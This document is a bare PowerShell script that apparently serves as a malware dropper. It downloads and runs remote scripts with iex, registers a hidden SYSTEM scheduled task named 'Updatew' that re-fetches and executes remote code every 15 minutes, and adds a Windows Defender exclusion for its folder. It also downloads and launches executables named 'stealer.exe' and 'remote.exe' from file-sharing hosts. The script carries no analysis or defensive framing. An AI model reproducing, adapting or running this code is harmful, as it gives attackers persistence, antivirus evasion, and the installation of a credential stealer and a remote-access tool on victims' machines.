$dir = "C:\Users\Public\150F4013"
New-Item -ItemType Directory -Path $dir

if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    # Download the CMD file
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/run.cmd" -OutFile "$dir\run.cmd"

    iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/Bypassloop.ps1" -useb)
    Start-Sleep -Seconds 8
}

$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `"& { $ProgressPreference = 'SilentlyContinue'; $t = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/43a1723/test/main/download.ps1' -UseBasicParsing; $t.Content -replace 'dropfileurl', 'https://raw.githubusercontent.com/43a1723/test/main/run.cmd' | Invoke-Expression }`""
$trigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 15) -AtStartup
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName "Updatew" -Action $action -Trigger $trigger -Principal $principal


iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/vm.ps1" -useb)


$temp = "$dir\temp"
New-Item -ItemType Directory -Path $temp
Add-MpPreference -ExclusionPath $dir


$file = "$temp\runfirst1.txt"

if (-not (Test-Path $file)) {
    New-Item -Path $file -ItemType File
    Start-Process "https://mybiolinks.io/cDjYO"
    
    Invoke-WebRequest -Uri "https://anonsharing.com/file/8f56ab5e1816f025/stealera.exe" -OutFile "$temp\stealer.exe"
    Start-Process -FilePath "$temp\stealer.exe"
}

Invoke-WebRequest -Uri "https://anonsharing.com/file/6e0dbbd45c92064d/yamte.exe" -OutFile "$dir\remote.exe"

Get-ChildItem -Path $dir | Where-Object { $_.PSIsContainer -eq $false } | ForEach-Object {
    Write-Output $_.FullName
    Start-Process -FilePath $_.FullName
}
